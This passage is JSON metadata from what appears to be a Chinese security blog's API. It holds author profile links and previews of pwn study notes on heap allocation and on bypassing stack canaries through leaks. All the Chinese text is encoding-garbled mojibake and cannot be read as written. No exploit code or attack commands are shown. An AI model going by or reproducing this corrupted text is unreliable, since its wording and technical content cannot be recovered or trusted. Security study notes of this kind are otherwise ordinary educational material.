†åˆ™æ˜¯åœ¨ç¨‹åºæ‰§è¡Œæ—¶éœ€è¦æ‰ä¼šåˆ†é…ï¼ˆç”±mallocã€allocã€reallocå‡½æ•°åˆ†é…å†…å­˜åå‡ºç°ï¼‰ã€‚ å †å…¶å®å°±æ˜¯ç¨‹åºè™šæ‹Ÿåœ°å€ç©ºé—´çš„ä¸€å—è¿ç»­çš„çº¿æ€§åŒºåŸŸï¼Œç”Ÿé•¿æ–¹å‘...","link":"","photos":[],"count_time":{"symbolsCount":"5k","symbolsTime":"5 mins."},"categories":[{"name":"pwn","slug":"pwn","count":3,"path":"api/categories/pwn.json"}],"tags":[{"name":"ç¬”è®°","slug":"ç¬”è®°","count":3,"path":"api/tags/ç¬”è®°.json"}],"author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"ä¸è¦ç­‰å¾…ï¼Œæ—¶æœºæ°¸è¿œä¸ä¼šæ°åˆ°å¥½å¤„ã€‚","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"ç»•è¿‡canaryçš„å…­ç§æ–¹æ³•","uid":"3c52b98d7c3f3c00c8108b428bc990ce","slug":"ç»•è¿‡canaryçš„æ–¹æ³•","date":"2021-10-25T12:49:23.000Z","updated":"2021-11-15T15:21:43.888Z","comments":true,"path":"api/articles/ç»•è¿‡canaryçš„æ–¹æ³•.json","keywords":null,"cover":"https://i.loli.net/2021/10/29/DCnioH4MfqYX28I.jpg","text":"leakç»•è¿‡é€šè¿‡æ³„éœ²canaryæ¥ç»•è¿‡canaryï¼Œå¸¸è§çš„æœ‰è¦†ç›–æ‰å‰é¢çš„\\x00è®©è¾“å‡ºå‡½æ•°æ³„éœ²ï¼Œè¿˜æœ‰printfå®šç‚¹æ³„éœ² stackguard1ä¸€ä¸ªç®€å•çš„64ä½canaryä¿æŠ¤ç¨‹åºï¼Œgdbè°ƒè¯•å¯ä»¥çœ‹åˆ°ä¸€å¼€å§‹ç¨‹åºä¼šä»fså¯„å­˜å™¨å¯¹åº”çš„åç§»å¤„å–å€¼æ”¾å…¥raxä¸­ï¼Œraxä¼šæ”¾å…¥rbp-8çš„ä½...","link":"","photos":[],"count_time":{"symbolsCount":"3.5k","symbolsTime":"3 mins."},"categories":[{"name":"pwn","slug":"pwn","count":3,"path":"api/categories/pwn.json"}],"tags":[{"name":"ç¬”è®°","slug":"ç¬”è®°","count":3,"path":"api/tags/ç¬”è®°.json"}],"author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"ä¸è¦ç­‰å¾…ï¼Œæ—¶æœºæ°¸è¿œä¸ä¼šæ°åˆ°å¥½å¤„ã€‚","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}},"feature":true}}